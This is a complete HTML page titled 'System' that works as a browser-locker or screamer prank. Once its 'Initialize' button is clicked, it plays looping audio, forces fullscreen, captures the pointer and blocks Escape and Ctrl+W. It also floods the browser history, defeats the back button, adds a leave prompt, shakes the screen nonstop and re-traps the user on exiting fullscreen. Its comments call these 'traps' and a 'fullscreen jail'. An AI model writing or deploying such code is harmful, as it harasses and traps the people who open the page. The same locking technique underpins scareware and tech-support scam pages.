<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System</title>
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: black; overflow: hidden; font-family: sans-serif;
        }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; justify-content: center; align-items: center;
            background: black; z-index: 9999;
        }
        button {
            padding: 20px 50px; font-size: 20px; cursor: pointer;
            background: #111; color: #444; border: 1px solid #222;
            text-transform: uppercase; letter-spacing: 2px;
        }
        button:hover { color: white; border-color: white; }
        #shaker { width: 100%; height: 100%; transition: transform 0.03s linear; }
    </style>
</head>
<body>

    <div id="overlay">
        <button id="gate">Initialize</button>
    </div>

    <div id="shaker"></div>

    <audio id="music" loop preload="auto"><source src="./mingleboosted.mp3"></audio>

    <script>
        const btn = document.getElementById('gate');
        const overlay = document.getElementById('overlay');
        const shaker = document.getElementById('shaker');
        const music = document.getElementById('music');

        btn.addEventListener('click', async () => {
            // 1. Audio Start
            music.play().catch(() => {});

            // 2. Fullscreen, Pointer, and Keyboard Locks
            const elem = document.documentElement;
            try {
                if (elem.requestFullscreen) await elem.requestFullscreen();
                
                // Locks mouse to the center
                if (elem.requestPointerLock) elem.requestPointerLock();

                // Blocks Esc and Ctrl+W (Chrome/Edge Only)
                if (navigator.keyboard && navigator.keyboard.lock) {
                    await navigator.keyboard.lock(["Escape", "KeyW"]);
                }
            } catch (err) {}

            // 3. UI Removal
            overlay.style.display = 'none';

            // 4. Persistence Mechanisms
            activateTraps();
        });

        function activateTraps() {
            // Anti-Back Button Navigation
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => window.history.go(1);

            // Infinite History Flood
            setInterval(() => {
                window.history.pushState(null, "", window.location.href);
            }, 100);

            // Native Leave Confirmation
            window.onbeforeunload = (e) => {
                e.preventDefault();
                e.returnValue = '';
            };

            // High-Frequency Screen Vibration
            setInterval(() => {
                const x = (Math.random() - 0.5) * 15;
                const y = (Math.random() - 0.5) * 15;
                shaker.style.transform = `translate(${x}px, ${y}px)`;
            }, 40);

            // Fullscreen Jail (Re-lock if they escape)
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) {
                    overlay.style.display = 'flex';
                }
            });
        }
    </script>
</body>
</html>
